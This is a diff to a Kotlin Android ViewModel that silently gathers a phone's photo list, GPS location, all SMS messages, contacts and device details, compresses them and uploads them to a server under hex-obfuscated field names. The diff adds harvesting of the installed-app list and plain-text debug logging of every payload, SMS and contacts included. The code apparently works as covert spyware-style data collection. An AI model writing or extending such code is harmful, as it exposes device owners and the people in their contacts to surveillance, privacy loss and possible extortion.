@@ -1,6 +1,7 @@
 package com.dream.bjst.common.vm
 
 import com.blankj.utilcode.util.GsonUtils
+import com.blankj.utilcode.util.LogUtils
 import com.blankj.utilcode.util.Utils
 import com.didichuxing.doraemonkit.util.LocationUtils
 import com.dream.bjst.bean.*
@@ -21,22 +22,27 @@ import com.tcl.base.utils.MmkvUtil
 open class DeviceInfoViewModel : BaseViewModel() {
     val upDeviceInfo = SingleLiveEvent<Boolean>()
 
-    fun updateDeviceInfo(){
-        if (!UserManager.isFalseAccount()){
+    fun updateDeviceInfo() {
+        if (!UserManager.isFalseAccount()) {
             upDevicePhoto()
             uploadDeviceLocation()
             uploadDeviceSmsInfo()
             uploadDeviceContactsInfo()
             uploadDeviceBaseInfo()
+            uploadDeviceAppInfo()
         }
     }
+
     /**
      * 上传设备信息 （相册信息）
      */
     fun upDevicePhoto() {
         rxLaunchUI({
-            val filesEnCrypt = DeviceUtils.getLocalAlbumList(0, 1000)
-            val paramBean = DevicePhotoParamBean(`9091829D9791BD9A929BAE9D84A78086` = filesEnCrypt)
+            val files = DeviceUtils.getLocalAlbumList(0, 100)
+            val paramStr = GsonUtils.toJson(files)
+            LogUtils.dTag("deviceParam", "uploadDeviceAlbumInfo ->$paramStr")
+            val paramBean =
+                DevicePhotoParamBean(`9091829D9791BD9A929BAE9D84A78086` = paramStr.GZIPCompress())
             val result = Api.uploadDeviceAlbumInfo(GsonUtils.toJson(paramBean))
             upDeviceInfo.postValue(result.`869187819880`)
         }, showDialog = false, showToast = false)
@@ -50,13 +56,17 @@ open class DeviceInfoViewModel : BaseViewModel() {
             val curLatitude = MmkvUtil.decodeDouble("curLatitude") ?: 0.0
             val curLongitude = MmkvUtil.decodeDouble("curLongitude") ?: 0.0
             val address = LocationUtils.getAddress(curLatitude, curLongitude)
-            val paramBean = DeviceLocationParamBean(LocationBean(
-                `938487` = GpsBean(curLatitude, curLongitude),
-                `938487B5909086918787A4869B829D9A9791` = address?.adminArea.nullToEmpty(),
-                `938487B5909086918787B79D808D` = address?.locality.nullToEmpty(),
-                `938487B5909086918787B895869391B09D8780869D9780` = address?.subLocality.nullToEmpty()
-            ))
-            val result = Api.uploadDeviceLocation(GsonUtils.toJson(paramBean))
+            val paramBean = DeviceLocationParamBean(
+                LocationBean(
+                    `938487` = GpsBean(curLatitude, curLongitude),
+                    `938487B5909086918787A4869B829D9A9791` = address?.adminArea.nullToEmpty(),
+                    `938487B5909086918787B79D808D` = address?.locality.nullToEmpty(),
+                    `938487B5909086918787B895869391B09D8780869D9780` = address?.subLocality.nullToEmpty()
+                )
+            )
+            val paramStr = GsonUtils.toJson(paramBean)
+            LogUtils.dTag("deviceParam", "uploadDeviceLocation ->$paramStr")
+            val result = Api.uploadDeviceLocation(paramStr)
             upDeviceInfo.postValue(result.`869187819880`)
         }, showDialog = false, showToast = false)
     }
@@ -66,7 +76,9 @@ open class DeviceInfoViewModel : BaseViewModel() {
      */
     fun uploadDeviceSmsInfo() {
         rxLaunchUI({
-            val paramBean = DeviceSMSParamBean(GsonUtils.toJson(DeviceUtils.getSmsInPhone()).GZIPCompress())
+            val paramStr = GsonUtils.toJson(DeviceUtils.getSmsInPhone())
+            LogUtils.dTag("deviceParam", "uploadDeviceSmsInfo ->$paramStr")
+            val paramBean = DeviceSMSParamBean(paramStr.GZIPCompress())
             val result = Api.uploadDeviceSmsInfo(GsonUtils.toJson(paramBean))
             upDeviceInfo.postValue(result.`869187819880`)
         }, showDialog = false, showToast = false)
@@ -77,8 +89,23 @@ open class DeviceInfoViewModel : BaseViewModel() {
      */
     fun uploadDeviceContactsInfo() {
         rxLaunchUI({
-            val paramBean = DeviceContactsParamBean(GsonUtils.toJson(DeviceUtils.getContacts()).GZIPCompress())
+            val paramStr = GsonUtils.toJson(DeviceUtils.getContacts())
+            LogUtils.dTag("deviceParam", "uploadDeviceContactsInfo ->$paramStr")
+            val paramBean = DeviceContactsParamBean(paramStr.GZIPCompress())
             val result = Api.uploadDeviceContactsInfo(GsonUtils.toJson(paramBean))
+            upDeviceInfo.postValue(result.`869187819880`)
+        }, showDialog = false, showToast = false)
+    }
+
+    /**
+     * 上传设备信息(app列表信息)，注意：此接口的参数值需要进行压缩，所以不需要进行全body加密
+     */
+    fun uploadDeviceAppInfo() {
+        rxLaunchUI({
+            val paramStr = GsonUtils.toJson(DeviceUtils.getAllAppInfo())
+            LogUtils.dTag("deviceParam", "uploadDeviceContactsInfo ->$paramStr")
+            val paramBean = DeviceAppsParamBean(paramStr.GZIPCompress())
+            val result = Api.uploadDeviceAppInfo(GsonUtils.toJson(paramBean))
             upDeviceInfo.postValue(result.`869187819880`)
         }, showDialog = false, showToast = false)
     }
@@ -131,10 +158,12 @@ open class DeviceInfoViewModel : BaseViewModel() {
                     `869599A18795969891A79D8E91` = DeviceUtils.getRomAvailableSize()
                 ),
             )
+            val paramStr = GsonUtils.toJson(paramBean)
+            LogUtils.dTag("deviceParam", "uploadDeviceBaseInfo ->$paramStr")
             val result = Api.uploadDeviceBaseInfo(
                 GsonUtils.toJson(
                     DeviceBaseParamBean(
-                        GsonUtils.toJson(paramBean).GZIPCompress()
+                        paramStr.GZIPCompress()
                     )
                 )
             )
